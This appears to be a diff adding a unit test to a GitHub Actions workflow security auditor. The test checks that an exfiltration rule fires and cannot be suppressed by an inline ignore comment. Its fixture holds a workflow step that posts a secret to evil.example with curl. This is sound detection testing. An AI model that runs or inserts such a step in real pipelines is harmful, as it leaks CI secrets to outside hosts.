@@ -39,3 +39,32 @@ def test_suppression_requires_line_proximity():
     ctx = RuleContext(suppressions=[Suppression("WF-CFG-003", line=99, reason="x")])
     out = apply_suppressions([_f("WF-CFG-003", Severity.LOW, line=5)], ctx)
     assert out[0].suppressed is False   # far-away directive does not apply
+
+
+def test_run_rules_finds_multiple_pillars_and_respects_suppression():
+    from credence.workflow_audit.parser import parse_workflow
+    from credence.workflow_audit.taint import resolve_job
+    from credence.workflow_audit.allowlist import parse_suppressions
+    from credence.workflow_audit.rules import run_rules, RuleContext
+
+    text = (
+        "on: pull_request_target\n"
+        "jobs:\n"
+        "  b:\n"
+        "    runs-on: x\n"
+        "    env:\n      T: ${{ secrets.PROD }}\n"
+        "    steps:\n"
+        "      - run: curl -d \"$T\" https://evil.example  # credence:ignore WF-EXFIL-001 reason=nope\n"
+        "      - run: some/action@main\n"
+    )
+    wf = parse_workflow(text, path="x")
+    resolved = {j.job_id: resolve_job(wf, j) for j in wf.jobs}
+    ctx = RuleContext(suppressions=parse_suppressions(text))
+    findings = run_rules(wf, resolved, ctx)
+    ids = {f.rule_id for f in findings}
+    # exfil + missing-permissions all fire
+    assert "WF-EXFIL-001" in ids
+    assert "WF-CFG-002" in ids
+    # the High exfil finding is NON-suppressible despite the inline directive
+    exfil = [f for f in findings if f.rule_id == "WF-EXFIL-001"][0]
+    assert exfil.suppressed is False
